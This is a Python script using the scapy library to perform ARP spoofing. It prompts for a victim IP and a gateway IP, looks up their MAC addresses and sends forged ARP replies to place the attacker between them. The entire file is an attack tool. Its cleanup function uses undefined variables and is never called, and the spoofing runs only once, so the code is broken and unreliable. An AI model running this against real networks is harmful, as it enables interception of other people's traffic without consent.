from scapy.all import *
import time

target_ip = input("Enter your target machine's IP address[192.168.50.200]=> ") or "192.168.50.200" # Victim's IP address 
router_ip = input("Enter your gateway's IP address[192.168.50.1]=> ") or  "192.168.50.1"   # Gateway IP address

def arp_spoof(target_ip, spoof_ip,hwaddress):
    packet =ARP(op=2, pdst=target_ip, hwdst=hwaddress,psrc=spoof_ip) # type: ignore
    send(packet, verbose=False)

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip) # type: ignore
    response = srp(packet, timeout=3, verbose=False)[0]
    mac_address = response[0][1].hwsrc
    print(f"Target's mac address=> {mac_address}")
    return mac_address

def reArp():
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(router_ip)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7) # type: ignore


try:
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(router_ip)
    arp_spoof(target_ip,router_ip,hwaddress=target_mac)
    arp_spoof(router_ip,target_ip,hwaddress=gateway_mac)
except KeyboardInterrupt:
    pass